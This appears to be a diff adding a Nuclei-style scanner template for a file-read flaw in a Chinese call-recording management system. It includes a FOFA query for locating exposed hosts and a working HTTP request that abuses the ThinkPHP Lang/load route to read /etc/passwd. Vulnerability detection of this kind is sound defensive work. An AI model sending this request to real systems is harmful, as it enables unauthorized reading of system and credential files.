@@ -1,0 +1,29 @@
+id: shenoutongxin-index_php-File-reading
+info:
+  name: "申瓯通信在线录音管理系统 index.php 文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="在线录音管理系统"
+      该系统 index.php 脚本存在文件访问控制缺陷，攻击者可利用此缺陷访问受限文件资源，例如数据库凭证文件及系统敏感配置文件，从而可能进一步获取系统控制权限或实施横向渗透攻击。此漏洞源于对用户提交的文件路径参数缺乏有效校验机制，允许通过构造特殊路径字符串绕过预期访问限制。
+  reference:
+  - https://mp.weixin.qq.com/s/CKCdqsVw2hfTstC_qdDVFg
+  tags: 申瓯通信
+
+http:
+- raw:
+  - |
+    GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/etc/passwd HTTP/1.1
+    Host: {{Hostname}} 
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'root:x:0'
+    - '/bin/false'
+    condition: and
+  - type: status
+    status:
+    - 500
